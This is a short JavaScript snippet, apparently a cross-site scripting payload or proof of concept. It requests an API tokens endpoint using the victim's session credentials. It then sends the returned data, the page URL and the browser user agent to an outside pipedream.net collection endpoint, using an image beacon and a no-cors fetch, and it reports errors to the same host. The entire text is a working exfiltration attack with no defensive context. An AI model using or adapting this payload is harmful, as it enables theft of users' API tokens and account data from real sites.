fetch("/api/tokens/697a3b225493767b73bb7bd8", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  console.log("[+] API data received:", data);

  const payload = {
    data,
    url: location.href,
    ua: navigator.userAgent
  };

  const exfilUrl = "https://eoeqgca83zpr7tb.m.pipedream.net?data=" + encodeURIComponent(JSON.stringify(payload));

  console.log("[+] Exfiltrating to:", exfilUrl);

  
  const img = new Image();
  img.src = exfilUrl;

  fetch(exfilUrl, { mode: "no-cors" });
})
.catch(err => {
  const errorUrl = "https://eoeqgca83zpr7tb.m.pipedream.net?error=" + encodeURIComponent(err.message);
  new Image().src = errorUrl;
});
